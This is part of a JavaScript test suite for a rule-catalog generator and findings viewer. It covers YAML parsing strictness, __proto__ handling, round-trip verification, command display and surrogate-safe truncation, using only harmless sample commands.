  var host = "PRE" + block + "POST";
  var a = host.indexOf(gen.BEGIN), b = host.indexOf(gen.END);
  eq("re-splicing the block recovers exactly the host prefix", host.slice(0, a), "PRE");
  eq("re-splicing the block recovers exactly the host suffix",
     host.slice(b + gen.END.length), "POST");
})();

// renderBlock emits ids sorted; buildCatalog inserts them in file-walk order.
// A whole-object compare would call that ordering difference an escaping fault.
(function(){
  var rules = { "zeta.rule":  { v:"1", sev:"high", kind:"expr", t:"Z", d:"z", g:[] },
                "alpha.rule": { v:"1", sev:"low",  kind:"expr", t:"A", d:"a", g:[] } };
  var meta  = { source:"/fixture", sha:"0".repeat(40), release:"fixture", rules:2 };
  eq("round-trip verification is insensitive to key order",
     gen.verifyRoundTrip(gen.renderBlock(meta, rules), meta, rules), null);
})();

// `rules["__proto__"] = x` on a plain object sets the prototype instead of
// adding a key: the rule vanishes while every count still agrees.
(function(){
  var y = ['id: __proto__', 'version: "1.0"', 'title: T', 'description: |-',
           '  d', 'severity: high'].join("\n");
  eq("a __proto__ rule id parses as an ordinary id", gen.parseRuleYAML(y).id, "__proto__");
  ok("__proto__ is on the generator's unsafe list", gen.UNSAFE_IDS.indexOf("__proto__") !== -1);
  ok("constructor is on the generator's unsafe list", gen.UNSAFE_IDS.indexOf("constructor") !== -1);
})();

// The parser must refuse shapes it cannot read rather than silently guessing.
(function(){
  function problems(y){ return gen.parseRuleYAML(y)._problems; }
  ok("an inline comment is refused, not folded into the value",
     problems('id: a\nseverity: high # tuned later\n').length > 0);
  ok("a wrapped inline list is refused, not stored as a fragment",
     problems('id: a\ntags: [one,\n  two]\n').length > 0);
  ok("a quoted item in an inline list is refused, not split on its comma",
     problems('id: a\ntags: ["a, b", c]\n').length > 0);
  ok("an escaped quote is refused rather than kept raw",
     problems('id: a\ntitle: "a \\"q\\" w"\n').length > 0);
  // block sequences are the common YAML list form and are now read, not lost
  eq("a block-style list is parsed rather than dropped",
     JSON.stringify(gen.parseRuleYAML('id: a\ntags:\n  - exfil\n  - network\n').tags),
     '["exfil","network"]');
  eq("a clean rule reports no problems",
     problems('id: a\nversion: "1"\ntitle: T\nseverity: high\ntags: [x]\n').length, 0);
})();

/* multi-line commands keep their shape, and truncation stays codepoint-safe */

(function(){
  var script = "cd /tmp\ngit add -A\ngit commit -F - <<'MSG'\nsubject line\nMSG";
  var ip = interpret(findingFor(EXPR_ID, { observed_command:script }), RULECAT);
  ok("a multi-line command keeps its line breaks",
     ip.sawHere.text.indexOf("\n") !== -1, JSON.stringify(ip.sawHere.text));
  ok("the heredoc body does not run into the command",
     ip.sawHere.text.indexOf("<<'MSG' subject") === -1, ip.sawHere.text);
  ok("runs of spaces are still collapsed",
     interpret(findingFor(EXPR_ID, { observed_command:"a     b" }), RULECAT).sawHere.text === "a b");
})();

(function(){
  // must exceed the 320-unit sawHere budget, and land the cut mid-pair
  var e = "😀".repeat(400);
  var ip = interpret(findingFor(EXPR_ID, { observed_command:e }), RULECAT);
  var t = ip.sawHere.text;
  var last = t.charCodeAt(t.length - 2);
  ok("truncation never leaves a lone high surrogate",
     !(last >= 0xD800 && last <= 0xDBFF), JSON.stringify(t.slice(-4)));
  ok("the emoji command is still truncated", t.slice(-1) === "…");
})();

/* ── invariants the viewer depends on ───────────────────────────────────── */

ok("the viewer declares its own icon so the browser does not probe /favicon.ico",
   /<link rel="icon" href="data:image\/svg\+xml,/.test(HTML));
ok("the icon is inlined rather than referencing a sibling file",
   HTML.indexOf('rel="icon" href="viewer/favicon.svg"') === -1 &&
   HTML.indexOf('rel="icon" href="favicon.svg"') === -1);

ok("the virtual-scroll row height is unchanged", /var ROW = 29\b/.test(HTML),
   "ROW must stay 29 — the list geometry is computed from it");
ok("esc() remains the single escape point in the interpretation render path",
   /function ipRender\(/.test(HTML) && HTML.indexOf("ipRender") !== -1);
ok("the interpretation block does not reference RULECAT directly",
   blockSrc("interpret").indexOf("RULECAT") === -1,
   "interpret() must take its catalog as an argument to stay independently testable");

/* ── report ─────────────────────────────────────────────────────────────── */

if(failures.length){
  process.stderr.write("\n" + failures.length + " failure" + (failures.length===1?"":"s") + ":\n\n");
  failures.forEach(function(f, i){ process.stderr.write("  " + (i+1) + ") " + f + "\n\n"); });
  process.stderr.write(pass + " passed, " + failures.length + " failed\n");
  process.exit(1);
}
process.stdout.write(pass + " assertions passed\n");
